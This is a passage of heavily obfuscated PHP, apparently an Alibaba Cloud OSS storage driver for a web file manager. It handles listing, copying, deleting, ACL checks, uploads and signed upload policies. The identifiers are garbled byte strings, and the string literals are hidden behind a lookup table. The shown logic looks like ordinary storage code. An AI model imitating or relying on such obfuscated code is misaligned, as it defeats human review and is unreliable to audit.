ù“‘[0] : $›ÈØûğ[12], $›ÈØûğ[232] => isset($ôó’‡§™[0]) ? $ôó’‡§™[0] : $›ÈØûğ[12]); } public function isBucketCors() { $’ÕÎƒ´„ =& $_SERVER[¤øïŠ‹²]; $ıòÙı½À = $this->getBucketCors(); if (!$ıòÙı½À || !is_array($ıòÙı½À)) { return !1; } if ($ıòÙı½À[$’ÕÎƒ´„[231]] != $’ÕÎƒ´„[233] || $ıòÙı½À[$’ÕÎƒ´„[232]] != $’ÕÎƒ´„[233]) { return !1; } $åÆÚÌ£‰ = array_map($’ÕÎƒ´„[234], $ıòÙı½À[$’ÕÎƒ´„[235]]); if (!is_array($åÆÚÌ£‰)) { $åÆÚÌ£‰ = array(); } $ˆò…»ë« = array($’ÕÎƒ´„[236], $’ÕÎƒ´„[237], $’ÕÎƒ´„[238], $’ÕÎƒ´„[239], $’ÕÎƒ´„[240]); $ÕÛË²ˆ = array_diff($ˆò…»ë«, $åÆÚÌ£‰); return empty($ÕÛË²ˆ); } public function mkfile($£œÁ×êÓ, $ÊÜ„ö¦‰ = '', $µ¹áß“Ñ = REPEAT_RENAME) { $Ÿ¯øé½Ì = $this->setContent($£œÁ×êÓ, $ÊÜ„ö¦‰); if ($Ÿ¯øé½Ì !== !1) { return $this->getPathOuter($£œÁ×êÓ); } return !1; } public function mkdir($ü¾Ö»á, $ ¥¼æŸ = REPEAT_SKIP) { if ($ ¥¼æŸ && $this->_isFolder($ü¾Ö»á)) { return $this->getPathOuter($ü¾Ö»á); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ü¾Ö»á)); } catch (OSS\Core\OssException $™¿˜ô¸„) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $™¿˜ô¸„->getMessage()); return !1; } return $this->getPathOuter($ü¾Ö»á); } private function fileList($öèğ×ßÇ, $È°ó—õÖ = '', $ó£Å¼° = 0) { $¸¿æ°‚ =& $_SERVER[¤øïŠ‹²]; $öèğ×ßÇ = trim($öèğ×ßÇ, $¸¿æ°‚[8]); $óú¤©‹µ = empty($öèğ×ßÇ) && $öèğ×ßÇ !== $¸¿æ°‚[241] ? $¸¿æ°‚[12] : $öèğ×ßÇ . $¸¿æ°‚[8]; $‚ûÊáÊò = $¸¿æ°‚[12]; $Û‡Ş¦¦ = 1000; $’ÙúÓº¿ = $Ö¤¨¬Ë¤ = array(); while (!0) { check_abort(); $Ô˜­ÁÃ‹ = array($¸¿æ°‚[1630] => $È°ó—õÖ, $¸¿æ°‚[1631] => $óú¤©‹µ, $¸¿æ°‚[1632] => $Û‡Ş¦¦, $¸¿æ°‚[1633] => $‚ûÊáÊò); try { $ÕáÀšªÕ = $this->client->listObjects($this->bucket, $Ô˜­ÁÃ‹); } catch (OSS\Core\OssException $¡í«öÎî) { $this->writeLog(__FUNCTION__ . $¸¿æ°‚[225] . $¡í«öÎî->getMessage()); break; } $‚ûÊáÊò = $ÕáÀšªÕ->getNextMarker(); $ŞÉÕé½ = $ÕáÀšªÕ->getObjectList(); $Â®¢¹¥‚ = $ÕáÀšªÕ->getPrefixList(); foreach ($ŞÉÕé½ as $ş†ÕÔ…—) { if ($ş†ÕÔ…—->getKey() == $óú¤©‹µ) { continue; } $Æıèš„ = $ş†ÕÔ…—->getKey(); $éË“øÊ· = $ş†ÕÔ…—->getSize(); $•À¢Œ = $ş†ÕÔ…—->getLastModified(); $îÕÎ×˜— = trim($ş†ÕÔ…—->getETag(), $¸¿æ°‚[130]); $ğ—¾³¬â = $ó£Å¼° ? array($¸¿æ°‚[32] => $Æıèš„, $¸¿æ°‚[90] => $éË“øÊ·, $¸¿æ°‚[217] => strtotime($•À¢Œ), $¸¿æ°‚[1634] => $îÕÎ×˜—) : $Æıèš„; $Î”à³ôÚ = $éË“øÊ· == 0 && substr($Æıèš„, strlen($Æıèš„) - 1, 1) == $¸¿æ°‚[8] ? !0 : !1; $¢²Šè = array($¸¿æ°‚[90] => $éË“øÊ·, $¸¿æ°‚[1635] => $éË“øÊ·, $¸¿æ°‚[99] => strtotime($•À¢Œ), $¸¿æ°‚[1636] => $•À¢Œ, $¸¿æ°‚[1634] => $îÕÎ×˜—); $this->cacheMethodInfoSet($Æıèš„, $Î”à³ôÚ, $¢²Šè); if ($Î”à³ôÚ) { $’ÙúÓº¿[] = $Æıèš„; continue; } $Ö¤¨¬Ë¤[] = $ğ—¾³¬â; } foreach ($Â®¢¹¥‚ as $ŸºúÖåò) { $’ÙúÓº¿[] = $ŸºúÖåò->getPrefix(); $this->cacheMethodInfoSet($ŸºúÖåò->getPrefix(), !0); } if ($‚ûÊáÊò === $¸¿æ°‚[12]) { break; } } $this->cacheMethodInfoSet($öèğ×ßÇ, !0); return array($¸¿æ°‚[96] => $’ÙúÓº¿, $¸¿æ°‚[97] => $Ö¤¨¬Ë¤); } public function listObject($ÎÜÒå©å, $ËÇæ®ñº = '') { $¢´•“¼á =& $_SERVER[¤øïŠ‹²]; $ÎÜÒå©å = trim($ÎÜÒå©å, $¢´•“¼á[8]); $ø‰²Í™à = empty($ÎÜÒå©å) && $ÎÜÒå©å !== $¢´•“¼á[241] ? $¢´•“¼á[12] : $ÎÜÒå©å . $¢´•“¼á[8]; $ÓĞîµ£è = $¢´•“¼á[12]; $„Öª¢¼¨ = 1000; $ç¸”ÕÙ– = $ĞÊ»‚£è = array(); while (!0) { check_abort(); $›œñÈµÂ = array($¢´•“¼á[1630] => $ËÇæ®ñº, $¢´•“¼á[1631] => $ø‰²Í™à, $¢´•“¼á[1632] => $„Öª¢¼¨, $¢´•“¼á[1633] => $ÓĞîµ£è); try { $¼…º¬¤Ô = $this->client->listObjects($this->bucket, $›œñÈµÂ); } catch (OSS\Core\OssException $¬™Åçê) { $this->writeLog(__FUNCTION__ . $¢´•“¼á[225] . $¬™Åçê->getMessage()); break; } $ÓĞîµ£è = $¼…º¬¤Ô->getNextMarker(); $’àèš‰ = $¼…º¬¤Ô->getObjectList(); foreach ($’àèš‰ as $½ÁÆâü“) { if ($½ÁÆâü“->getKey() == $ø‰²Í™à) { continue; } $Ó×›íş  = $½ÁÆâü“->getKey(); $‹”ÅßÊ = $½ÁÆâü“->getSize(); $×ò­Ãğ› = $‹”ÅßÊ == 0 && substr($Ó×›íş , strlen($Ó×›íş ) - 1, 1) == $¢´•“¼á[8] ? !0 : !1; if ($×ò­Ãğ›) { continue; } $ĞÊ»‚£è[] = $‹”ÅßÊ . $¢´•“¼á[225] . $Ó×›íş ; } if ($ÓĞîµ£è === $¢´•“¼á[12]) { break; } } return array($¢´•“¼á[96] => $ç¸”ÕÙ–, $¢´•“¼á[97] => $ĞÊ»‚£è); } public function copyFile($ŸË“æ¹ê, $ëË®ùàÚ) { $ş­áÒ­¤ = $this->size($ŸË“æ¹ê); if ($ş­áÒ­¤ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ŸË“æ¹ê, $this->bucket, $this->pathEncode($ëË®ùàÚ)); } catch (OSS\Core\OssException $Œ¸Ñ´×) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $Œ¸Ñ´×->getMessage()); return !1; } return $this->getPathOuter($ëË®ùàÚ); } $ı´î…¯Ğ = $this->multiCopyObject($ŸË“æ¹ê, $ëË®ùàÚ, $ş­áÒ­¤); return $ı´î…¯Ğ ? $this->getPathOuter($ëË®ùàÚ) : !1; } private function multiCopyObject($óÆÑüõó, $·Šã¬Ïğ, $·ûûÓ) { $òˆèÍ« =& $_SERVER[¤øïŠ‹²]; try { $¼â…´çÇ = array(); if ($ÚÉÕÏ…š = $this->hashMd5($óÆÑüõó)) { $¼â…´çÇ = array(OSS\OssClient::OSS_HEADERS => array($òˆèÍ«[1637] => $ÚÉÕÏ…š)); } $ÊŸŞÎ‘½ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($·Šã¬Ïğ), $¼â…´çÇ); $Ä³…¨¹´ = 1; $Ûñ÷¡ë = 0; $¨’üÈ¨ƒ = array(); $¸²å«ƒæ = 1024 * 1024 * 10; $’ü‰£ïÄ = $this->client->generateMultiuploadParts($·ûûÓ, $¸²å«ƒæ); foreach ($’ü‰£ïÄ as $§—˜¸Ÿ => $ÌÅƒŠ¯Ò) { $±ÖûÅ×” = $Ûñ÷¡ë + (int) $ÌÅƒŠ¯Ò[$òˆèÍ«[1638]]; $³¡†èœ = (int) $ÌÅƒŠ¯Ò[$òˆèÍ«[424]] + $±ÖûÅ×” - 1; $À€†”–û = array($òˆèÍ«[177] => $±ÖûÅ×”, $òˆèÍ«[178] => $³¡†èœ); $¨’üÈ¨ƒ[] = $this->client->uploadPartCopy($this->bucket, $óÆÑüõó, $this->bucket, $this->pathEncode($·Šã¬Ïğ), $Ä³…¨¹´, $ÊŸŞÎ‘½, $À€†”–û); $Ä³…¨¹´ = $Ä³…¨¹´ + 1; } $•ÑÙ—ªˆ = array(); foreach ($¨’üÈ¨ƒ as $§—˜¸Ÿ => $Ò·ôÜåˆ) { $•ÑÙ—ªˆ[] = array($òˆèÍ«[309] => $§—˜¸Ÿ + 1, $òˆèÍ«[310] => $Ò·ôÜåˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($·Šã¬Ïğ), $ÊŸŞÎ‘½, $•ÑÙ—ªˆ); } catch (OSS\Core\OssException $çŠœí´ù) { $this->writeLog(__FUNCTION__ . $òˆèÍ«[225] . $çŠœí´ù->getMessage()); return !1; } return !0; } public function moveFile($ıúÁŒ‹×, $¿ãÔºÄ±) { if ($this->copyFile($ıúÁŒ‹×, $¿ãÔºÄ±)) { $this->remove($ıúÁŒ‹×); return $this->getPathOuter($¿ãÔºÄ±); } return !1; } public function delFile($¿ãóº»Ô) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¿ãóº»Ô)); } catch (OSS\Core\OssException $À·ùëÈÙ) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $À·ùëÈÙ->getMessage()); return !1; } return !0; } public function delFolder($áºÉû¾) { $·ë¡™±È =& $_SERVER[¤øïŠ‹²]; if (!$this->exist($áºÉû¾)) { return !0; } $this->listItemCache = !1; $¿„Ò¹­ = $this->fileList($áºÉû¾); $this->listItemCache = !0; $ø®Ãß˜È = trim($áºÉû¾, $·ë¡™±È[8]) . $·ë¡™±È[8]; if (!empty($áºÉû¾) && $áºÉû¾ !== $·ë¡™±È[241] && !in_array($ø®Ãß˜È, $¿„Ò¹­[$·ë¡™±È[96]])) { $¿„Ò¹­[$·ë¡™±È[96]][] = $ø®Ãß˜È; } $¤‚ÄĞ˜Ü = $this->delByBatch($¿„Ò¹­[$·ë¡™±È[97]]); if (!$¤‚ÄĞ˜Ü) { return !1; } $¤‚ÄĞ˜Ü = $this->delByBatch($¿„Ò¹­[$·ë¡™±È[96]]); if (!$¤‚ÄĞ˜Ü) { return !1; } return $this->delFile($ø®Ãß˜È); } private function delByBatch($Åß·“—Á) { foreach (array_chunk($Åß·“—Á, 1000) as $›ø¸ôÈ) { try { $this->client->deleteObjects($this->bucket, $›ø¸ôÈ); } catch (OSS\Core\OssException $•¦’ú„) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $•¦’ú„->getMessage()); return !1; } } return !0; } public function rename($¾ñ±¬û, $‰ÖˆÕŞ¯) { return $this->renameObject($¾ñ±¬û, $‰ÖˆÕŞ¯); } private function fileInfo($…Å’†Áë, $ÓºÅÖıä = false, $¸ıÕ—’Æ = array()) { $Á«öÂ£ =& $_SERVER[¤øïŠ‹²]; $Åä³†šı = array($Á«öÂ£[32] => $this->pathThis($…Å’†Áë), $Á«öÂ£[98] => $this->getPathOuter($…Å’†Áë), $Á«öÂ£[33] => $Á«öÂ£[243], $Á«öÂ£[90] => isset($¸ıÕ—’Æ[$Á«öÂ£[90]]) ? $¸ıÕ—’Æ[$Á«öÂ£[90]] : 0, $Á«öÂ£[179] => $this->ext($…Å’†Áë)); if ($ÓºÅÖıä) { return $Åä³†šı; } $Åä³†šı[$Á«öÂ£[244]] = $Åä³†šı[$Á«öÂ£[99]] = 0; $Åä³†šı[$Á«öÂ£[245]] = $Åä³†šı[$Á«öÂ£[246]] = !0; if (empty($¸ıÕ—’Æ)) { $ˆÒ’äŞÌ = $this->objectMeta($…Å’†Áë); if (!$ˆÒ’äŞÌ) { return $Åä³†šı; } $¸ıÕ—’Æ = array($Á«öÂ£[99] => strtotime($ˆÒ’äŞÌ[$Á«öÂ£[1636]]), $Á«öÂ£[90] => $ˆÒ’äŞÌ[$Á«öÂ£[1635]] + 0, $Á«öÂ£[1634] => $ˆÒ’äŞÌ[$Á«öÂ£[1634]]); } if (isset($¸ıÕ—’Æ[$Á«öÂ£[1634]]) && $¸ıÕ—’Æ[$Á«öÂ£[1634]]) { $Åä³†šı[$Á«öÂ£[248]] = trim($¸ıÕ—’Æ[$Á«öÂ£[1634]], $Á«öÂ£[130]); } if (isset($¸ıÕ—’Æ[$Á«öÂ£[90]])) { $Åä³†šı[$Á«öÂ£[90]] = $¸ıÕ—’Æ[$Á«öÂ£[90]]; } if (isset($¸ıÕ—’Æ[$Á«öÂ£[99]])) { $Åä³†šı[$Á«öÂ£[99]] = $¸ıÕ—’Æ[$Á«öÂ£[99]]; } if (isset($¸ıÕ—’Æ[$Á«öÂ£[217]]) && !trim($Åä³†šı[$Á«öÂ£[99]])) { $Åä³†šı[$Á«öÂ£[99]] = $¸ıÕ—’Æ[$Á«öÂ£[217]]; } return $Åä³†šı; } private function folderInfo($åèñ™Û–, $«Ì„Ê±ê = false, $¶Ñ«ãŠ = array()) { $éö‘Ûø¡ =& $_SERVER[¤øïŠ‹²]; $ğ¬«êùŠ = array($éö‘Ûø¡[32] => $this->pathThis($åèñ™Û–), $éö‘Ûø¡[98] => $this->getPathOuter($éö‘Ûø¡[8] . $åèñ™Û–), $éö‘Ûø¡[33] => $éö‘Ûø¡[89]); if ($«Ì„Ê±ê) { return $ğ¬«êùŠ; } $ğ¬«êùŠ[$éö‘Ûø¡[244]] = $ğ¬«êùŠ[$éö‘Ûø¡[99]] = 0; $ğ¬«êùŠ[$éö‘Ûø¡[245]] = $ğ¬«êùŠ[$éö‘Ûø¡[246]] = !0; if (empty($¶Ñ«ãŠ)) { $åèñ™Û– = rtrim($åèñ™Û–, $éö‘Ûø¡[8]) . $éö‘Ûø¡[8]; $ÚòÏãƒ¼ = $this->objectMeta($åèñ™Û–); if (!$ÚòÏãƒ¼) { return $ğ¬«êùŠ; } $¶Ñ«ãŠ = array($éö‘Ûø¡[244] => $ÚòÏãƒ¼[$éö‘Ûø¡[601]][$éö‘Ûø¡[1639]], $éö‘Ûø¡[99] => strtotime($ÚòÏãƒ¼[$éö‘Ûø¡[1636]])); } if (isset($¶Ñ«ãŠ[$éö‘Ûø¡[99]])) { $ğ¬«êùŠ[$éö‘Ûø¡[99]] = $¶Ñ«ãŠ[$éö‘Ûø¡[99]]; } if (isset($¶Ñ«ãŠ[$éö‘Ûø¡[244]])) { $ğ¬«êùŠ[$éö‘Ûø¡[244]] = $¶Ñ«ãŠ[$éö‘Ûø¡[244]]; } return $ğ¬«êùŠ; } public function listPath($ˆù±¿Æı, $¤Àµ…—à = false) { $¡ëû¥Ø =& $_SERVER[¤øïŠ‹²]; $ªÒÓØÌ£ = $this->fileList($ˆù±¿Æı, $¡ëû¥Ø[8], !0); foreach ($ªÒÓØÌ£[$¡ëû¥Ø[96]] as $¾ŒøÚ => $¬­ÖšØ) { $ªÒÓØÌ£[$¡ëû¥Ø[96]][$¾ŒøÚ] = $this->folderInfo($¬­ÖšØ, $¤Àµ…—à, $¬­ÖšØ); } foreach ($ªÒÓØÌ£[$¡ëû¥Ø[97]] as $¾ŒøÚ => $¬­ÖšØ) { $ªÒÓØÌ£[$¡ëû¥Ø[97]][$¾ŒøÚ] = $this->fileInfo($¬­ÖšØ[$¡ëû¥Ø[32]], $¤Àµ…—à, $¬­ÖšØ); } return $ªÒÓØÌ£; } protected function infoChildren($’à•ËÚ, &$ÊÌ‰Ÿ¼×) { $¬ïè—º =& $_SERVER[¤øïŠ‹²]; $ŒÈÚê™Æ = $this->fileList($’à•ËÚ, $¬ïè—º[12], !0); $ÊÌ‰Ÿ¼×[$¬ïè—º[92]] += count($ŒÈÚê™Æ[$¬ïè—º[96]]); $ÊÌ‰Ÿ¼×[$¬ïè—º[91]] += count($ŒÈÚê™Æ[$¬ïè—º[97]]); foreach ($ŒÈÚê™Æ[$¬ïè—º[97]] as $ªäõĞóˆ) { if (!$ªäõĞóˆ || !$ªäõĞóˆ[$¬ïè—º[90]]) { continue; } $ÊÌ‰Ÿ¼×[$¬ïè—º[90]] += $ªäõĞóˆ[$¬ïè—º[90]]; } } public function has($Şê»Û‹, $©ØËïëØ = false, $ï­é“¤© = true) { $º¶«Äœ =& $_SERVER[¤øïŠ‹²]; $Şê»Û‹ = trim($Şê»Û‹, $º¶«Äœ[8]); $¼Äø¾†– = empty($Şê»Û‹) && $Şê»Û‹ !== $º¶«Äœ[241] ? $º¶«Äœ[12] : $Şê»Û‹ . $º¶«Äœ[8]; $ã²¤ô¦è = $º¶«Äœ[12]; $€µâå÷ = 500; $Ú÷Í‚½µ = $ŸÄÄš´È = 0; while (!0) { check_abort(); $ä¶ˆ‘‚Ù = array($º¶«Äœ[1630] => $º¶«Äœ[8], $º¶«Äœ[1631] => $¼Äø¾†–, $º¶«Äœ[1632] => $€µâå÷, $º¶«Äœ[1633] => $ã²¤ô¦è); try { $ ö–áıÈ = $this->client->listObjects($this->bucket, $ä¶ˆ‘‚Ù); } catch (OSS\Core\OssException $±¿Ãœİ) { $this->writeLog(__FUNCTION__ . $º¶«Äœ[225] . $±¿Ãœİ->getMessage()); break; } $ã²¤ô¦è = $ ö–áıÈ->getNextMarker(); $›‘ïß´© = $ ö–áıÈ->getObjectList(); $ß……¾íø = $ ö–áıÈ->getPrefixList(); if ($©ØËïëØ) { if (count($›‘ïß´©) > 1 || count($›‘ïß´©) == 1 && $›‘ïß´©[0]->getKey() != $¼Äø¾†–) { $Ú÷Í‚½µ += count($›‘ïß´©) - 1; } if (!empty($ß……¾íø)) { $ŸÄÄš´È += count($ß……¾íø); } if ($ã²¤ô¦è === $º¶«Äœ[12]) { break; } continue; } if ($ï­é“¤©) { if (!empty($›‘ïß´©)) { if (count($›‘ïß´©) > 1 || $›‘ïß´©[0]->getKey() != $¼Äø¾†–) { return !0; } } } else { if (!empty($ß……¾íø)) { return !0; } } if ($ã²¤ô¦è === $º¶«Äœ[12]) { break; } } if ($©ØËïëØ) { return array($º¶«Äœ[252] => $Ú÷Í‚½µ, $º¶«Äœ[253] => $ŸÄÄš´È); } return !1; } public function listAll($ß¿ÓÁæÄ) { $Ó¹óÉÉß =& $_SERVER[¤øïŠ‹²]; $’ìÖÈ¯½ = $this->fileList($ß¿ÓÁæÄ, $Ó¹óÉÉß[12], !0); $§‘Ö©üË = array_to_keyvalue($’ìÖÈ¯½[$Ó¹óÉÉß[97]], $Ó¹óÉÉß[32]); foreach ($’ìÖÈ¯½[$Ó¹óÉÉß[96]] as $³êßşôÕ) { if (is_string($³êßşôÕ)) { $§‘Ö©üË[$³êßşôÕ] = array($Ó¹óÉÉß[90] => 0); } } return $this->listAllFiles($ß¿ÓÁæÄ, $§‘Ö©üË); } public function canRead($­ ½ùê) { $÷ùŒ€˜ì =& $_SERVER[¤øïŠ‹²]; $Ì”ğì  = $this->pathAcl($­ ½ùê); return $Ì”ğì  == $÷ùŒ€˜ì[1640] || $Ì”ğì  == $÷ùŒ€˜ì[648] ? !0 : !1; } public function canWrite($¢Îù”£¸) { $…šÒøÔĞ = $this->pathAcl($¢Îù”£¸); return $…šÒøÔĞ == $_SERVER[¤øïŠ‹²][648] ? !0 : !1; } public function pathAcl($øû‹Óğâ) { $ï§¦¡ˆú =& $_SERVER[¤øïŠ‹²]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $à¿¶¾‡« = $this->client->getObjectAcl($this->bucket, $this->pathEncode($øû‹Óğâ)); } catch (OSS\Core\OssException $ä®¼é·) { $this->writeLog(__FUNCTION__ . $ï§¦¡ˆú[225] . $ä®¼é·->getMessage()); return !1; } $Úº¬· ” = $à¿¶¾‡« == $ï§¦¡ˆú[37] ? $this->bucketAcl : $à¿¶¾‡«; if ($Úº¬· ” == $ï§¦¡ˆú[1641]) { return $ï§¦¡ˆú[1640]; } if ($Úº¬· ” == $ï§¦¡ˆú[1642]) { return $ï§¦¡ˆú[648]; } return $Úº¬· ”; } private function chmodPath($³± Ô–×, $ÅûÓÈâ» = '') { $¨¶ëã =& $_SERVER[¤øïŠ‹²]; $¶ˆµ¾îÄ = empty($ÅûÓÈâ») ? $¨¶ëã[1642] : $ÅûÓÈâ»; $Åçâ“¥“ = array($¨¶ëã[37], $¨¶ëã[242], $¨¶ëã[1641], $¨¶ëã[1642]); if (!in_array($¶ˆµ¾îÄ, $Åçâ“¥“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($³± Ô–×), $¶ˆµ¾îÄ); } catch (OSS\Core\OssException $Ø÷ı ëÇ) { $this->writeLog(__FUNCTION__ . $¨¶ëã[225] . $Ø÷ı ëÇ->getMessage()); return !1; } return !0; } public function getContent($Ó”Œ’í¥) { return $this->fileSubstr($Ó”Œ’í¥, -1); } public function setContent($‹ŠÈÖ»°, $¡·‰¾Šê = '') { $°¬Ğã€Ö =& $_SERVER[¤øïŠ‹²]; try { $Í•©ôğ = $this->trafficLimit($°¬Ğã€Ö[1643]); $èƒ¡‹ºó = $this->client->putObject($this->bucket, $this->pathEncode($‹ŠÈÖ»°), $¡·‰¾Šê, $Í•©ôğ); } catch (OSS\Core\OssException $œŸèºşÛ) { $this->writeLog(__FUNCTION__ . $°¬Ğã€Ö[225] . $œŸèºşÛ->getMessage()); return !1; } $µÉ§Ú– = array($°¬Ğã€Ö[1637] => trim($èƒ¡‹ºó[$°¬Ğã€Ö[1634]], $°¬Ğã€Ö[130]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‹ŠÈÖ»°))); $this->updateObjMeta($‹ŠÈÖ»°, $µÉ§Ú–); return isset($èƒ¡‹ºó[$°¬Ğã€Ö[1644]][$°¬Ğã€Ö[306]]) ? !0 : !1; } private function updateObjMeta($›ãß§¹Ğ, $ê—úü) { $›ãß§¹Ğ = $this->pathEncode($›ãß§¹Ğ); try { $õ¶ûÕ¯ = array(OSS\OssClient::OSS_HEADERS => $ê—úü); $this->client->copyObject($this->bucket, $›ãß§¹Ğ, $this->bucket, $›ãß§¹Ğ, $õ¶ûÕ¯); } catch (OSS\Core\OssException $“ùûšóÑ) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $“ùûšóÑ->getMessage()); return !1; } return !0; } public function upload($ÃŒ¥—í‹, $ºê·¢¤à, $Ì•Èæ‚â = false, $¢Ì©á§ = REPEAT_REPLACE) { $Á¾›Ç• =& $_SERVER[¤øïŠ‹²]; if (!$ºê·¢¤à || !@file_exists($ºê·¢¤à)) { return !1; } $›““µŒ’ = trim($ÃŒ¥—í‹, $Á¾›Ç•[8]); $É•‡‚¦ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Á¾›Ç•[1637] => @md5_file($ºê·¢¤à)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÃŒ¥—í‹))); $É•‡‚¦ = $this->trafficLimit($Á¾›Ç•[1643], $É•‡‚¦); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($›““µŒ’), $ºê·¢¤à, $É•‡‚¦); } catch (OSS\Core\OssException $ö­Ó¤©í) { $this->writeLog(__FUNCTION__ . $Á¾›Ç•[225] . $ö­Ó¤©í->getMessage()); return !1; } return $this->getPathOuter($ÃŒ¥—í‹); } public function getHost() { $½±ö›…³ =& $_SERVER[¤øïŠ‹²]; $ğÀ˜ªµ = explode($½±ö›…³[221], parent::getHost()); return $ğÀ˜ªµ[0] . $½±ö›…³[221] . $this->bucket . $½±ö›…³[10] . $ğÀ˜ªµ[1]; } public function uploadFormData($ãÎ­ËÚ¿, $ÖÈÁ›Ó³ = 3600) { $ñÌëÖÏÅ =& $_SERVER[¤øïŠ‹²]; if (!($ÀÓ‹è˜ = $this->getHost())) { return !1; } $³îââ¥ô = $ÖÈÁ›Ó³; $©„ßúÌñ = date($ñÌëÖÏÅ[1645], time() + $³îââ¥ô); $äÎƒ¯™½ = new DateTime($©„ßúÌñ); $ÒÖˆ¯·É = $äÎƒ¯™½->format(DateTime::ISO8601); $èŞ“¸³Ä = strpos($ÒÖˆ¯·É, $ñÌëÖÏÅ[383]); $ÒÖˆ¯·É = substr($ÒÖˆ¯·É, 0, $èŞ“¸³Ä) . $ñÌëÖÏÅ[1646]; $ò¨–¹Êç = 1048576000 * 5; $çÙ¨ª¨Õ = $this->pathFather($ãÎ­ËÚ¿); $ÑÕ¿Õ¿© = array($ñÌëÖÏÅ[275] => $ÒÖˆ¯·É, $ñÌëÖÏÅ[278] => array(array($ñÌëÖÏÅ[1647], 0, $ò¨–¹Êç), array($ñÌëÖÏÅ[280], $ñÌëÖÏÅ[281], $çÙ¨ª¨Õ))); $£²‰ï¥ = base64_encode(json_encode($ÑÕ¿Õ¿©)); $êï§¨Ø– = base64_encode(hash_hmac($ñÌëÖÏÅ[1473], $£²‰ï¥, $this->secret, !0)); $Â»Öşòå = array($ñÌëÖÏÅ[1648] => $this->accessKey, $ñÌëÖÏÅ[290] => $£²‰ï¥, $ñÌëÖÏÅ[283] => $ñÌëÖÏÅ[274], $ñÌëÖÏÅ[1649] => $êï§¨Ø–, $ñÌëÖÏÅ[219] => $ÀÓ‹è˜); $Â»Öşòå = $this->trafficLimit($ñÌëÖÏÅ[1643], $Â»Öşòå, !0); return $Â»Öşòå; } public function uploadMultiData($¤÷õÚë´, $¿÷Ñ÷ ¹ = 3600) { $Õ©á‚µô =& $_SERVER[¤øïŠ‹²]; if (!($íËçõãê = $this->getHost())) { return !1; } $¨¹‰ÁÙ² = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¤÷õÚë´)); return array($Õ©á‚µô[294] => $¨¹‰ÁÙ², $Õ©á‚µô[219] => $íËçõãê . $Õ©á‚µô[8] . $this->pathEncode($¤÷õÚë´), $Õ©á‚µô[295] => gmdate($Õ©á‚µô[1650]), $Õ©á‚µô[106] => $¤÷õÚë´); } public function uploadMultiAuth($ ¿İöÅ, $†á—š…Ï = array()) { if (isset($†á—š…Ï[$_SERVER[¤øïŠ‹²][296]])) { return $this->uploadPartAuth($ ¿İöÅ, $†á—š…Ï); } return $this->uploadListAuth($ ¿İöÅ, $†á—š…Ï); } private function uploadPartAuth($Ùàî’‹ï, $Èæ¾•ÁÑ = array()) { $­±øÙ­ =& $_SERVER[¤øïŠ‹²]; $¿äçş× = $Èæ¾•ÁÑ[$­±øÙ­[106]]; $³™¶‹ù = $this->_getUploadAuth($¿äçş×, $Èæ¾•ÁÑ); $îãàÃÛø = array($­±øÙ­[298] => $³™¶‹ù[$­±øÙ­[298]], $­±øÙ­[295] => $³™¶‹ù[$­±øÙ­[295]]); if (isset($³™¶‹ù[$­±øÙ­[1651]])) { $îãàÃÛø[$­±øÙ­[1651]] = $³™¶‹ù[$­±øÙ­[1651]]; } return $îãàÃÛø; } private function uploadListAuth($Œçìˆ›‹, $‡Ó®³Ô = array()) { $ˆ—¤ù• =& $_SERVER[¤øïŠ‹²]; $²ÀÖ = $‡Ó®³Ô[$ˆ—¤ù•[106]]; $Šèé—Ÿ§ = $‡Ó®³Ô[$ˆ—¤ù•[294]]; $‡Ï±Èç = $this->client->listParts($this->bucket, $this->pathEncode($²ÀÖ), $Šèé—Ÿ§); $‰Ê‹ÓÚ˜ = $‡Ï±Èç->getListPart(); $Ÿõ‘†³— = array(); foreach ($‰Ê‹ÓÚ˜ as $®ß½§²‚) { $Ÿõ‘†³—[] = array($ˆ—¤ù•[309] => $®ß½§²‚->getPartNumber(), $ˆ—¤ù•[310] => trim($®ß½§²‚->getETag(), $ˆ—¤ù•[130])); } if (!$Ÿõ‘†³—) { return !1; } $ü®×¥ì = $this->_getUploadAuth($²ÀÖ, $‡Ó®³Ô); return array($ˆ—¤ù•[298] => $ü®×¥ì[$ˆ—¤ù•[298]], $ˆ—¤ù•[295] => $ü®×¥ì[$ˆ—¤ù•[295]], $ˆ—¤ù•[301] => $Ÿõ‘†³—); } private function _getUploadAuth($Á“‹ä‡ü, $ãû”Šşğ) { $Ç½§Í±› =& $_SERVER[¤øïŠ‹²]; $¶Ãœˆ“¡ = gmdate($Ç½§Í±›[1650]); $ü°«—Ö = isset($ãû”Šşğ[$Ç½§Í±›[296]]) ? $Ç½§Í±›[266] : $Ç½§Í±›[300]; $Æ¼ŞÃÁ« = array_intersect_key($ãû”Šşğ, array_flip(array($Ç½§Í±›[296], $Ç½§Í±›[294]))); ksort($Æ¼ŞÃÁ«); $àâĞ”° = $Æ¼ŞÃÁ« ? $Ç½§Í±›[87] . http_build_query($Æ¼ŞÃÁ«, null, $Ç½§Í±›[297], PHP_QUERY_RFC3986) : $Ç½§Í±›[12]; $ÃÒúãŠÂ = array($ü°«—Ö, $Ç½§Í±›[12], $Ç½§Í±›[132], $¶Ãœˆ“¡, "\x78\x2d\157\163\x73\x2d\144\141\x74\145\72{$¶Ãœˆ“¡}", $Ç½§Í±›[8] . $this->bucket . $Ç½§Í±›[8] . $Á“‹ä‡ü . $àâĞ”°); if (isset($ãû”Šşğ[$Ç½§Í±›[296]])) { $¥¬òµ¸¥ = 